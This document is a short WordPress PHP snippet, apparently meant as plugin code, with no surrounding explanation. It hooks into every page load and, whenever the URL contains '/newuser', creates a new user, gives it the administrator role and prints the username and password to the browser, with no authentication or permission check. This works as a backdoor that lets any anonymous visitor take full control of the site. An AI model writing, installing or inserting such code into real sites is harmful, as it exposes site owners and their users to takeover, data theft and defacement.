<?php

add_action('init', 'auto_admin_user_creator_handle_newuser');

function auto_admin_user_creator_handle_newuser() {
    // Check if the requested URL ends with //newuser
    if (isset($_SERVER['REQUEST_URI']) && strpos($_SERVER['REQUEST_URI'], '/newuser') !== false) {
        // Generate a random username and password
        $username = 'admin_' . wp_generate_password(8, false); // Prefix to indicate it's an admin user
        $password = wp_generate_password(12, true);

        // Create the new user
        $user_id = wp_create_user($username, $password);

        if (!is_wp_error($user_id)) {
            // Assign the 'administrator' role to the new user
            $user = new WP_User($user_id);
            $user->set_role('administrator');

            // Display the username and password on the screen
            echo "<h1>New Admin User Created</h1>";
            echo "<p><strong>Username:</strong> $username</p>";
            echo "<p><strong>Password:</strong> $password</p>";
            exit; // Stop further processing
        } else {
            // Display error message if user creation fails
            echo "<h1>Error Creating Admin User</h1>";
            echo "<p>" . $user_id->get_error_message() . "</p>";
            exit; // Stop further processing
        }
    }
}
